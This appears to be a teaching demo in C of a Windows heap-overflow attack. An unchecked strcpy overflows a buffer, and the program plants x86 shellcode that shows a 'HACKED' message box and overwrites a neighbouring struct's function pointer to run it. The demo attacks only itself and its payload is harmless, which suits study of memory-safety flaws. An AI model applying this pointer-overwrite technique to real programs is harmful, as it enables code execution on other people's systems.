#include "stdafx.h"
#include <windows.h>
#include <stdlib.h>
#include <string.h>

typedef void(*PFN_PRINT)(void*);
typedef struct
{
	PFN_PRINT print;
	char name[252];
} Test;

void printName(Test* t)
{
	printf("%s\n", t->name);
}


char G_SHELL_CODE[] = "\x90\x90\x90\x90"
"\x6A\x10"						// push 10h
"\x6A\x00"						// push 0
"\x68\xFF\xFF\xFF\xFF"			// push FFFFFFFFh
"\x6A\x00"						// push 0
"\xFF\x15\x74\x91\x41\x00"		// call 419174h(MessageBoxA)
"\x6A\x01"						// push 1
"\xFF\x15\xF0\x90\x41\x00"		// call 4190F0h(exit)
"\x90\x90\x90"
"Your program HACKED!!!\x00\x00";

void _tmain(void)
{
	printf(".... Attack using Heap Overflow.\n");

	char* p1 = (char*)malloc(32);
	Test* t1 = (Test*)malloc(sizeof(Test));
	t1->print = (PFN_PRINT)printName;

	strcpy(p1, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
			   "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
			   "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
	int p1Len = strlen(p1) + 1;
	char* shCode = p1 + p1Len;
	memcpy(shCode, G_SHELL_CODE, sizeof(G_SHELL_CODE)-1);
	*((unsigned int*)(p1 + 32 + 64)) = (int)shCode;
	*((unsigned int*)(shCode + 9)) = (int)(shCode + 32);


	strcpy(t1->name, "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB");
	t1->print(t1);

	free(t1);
	free(p1);
}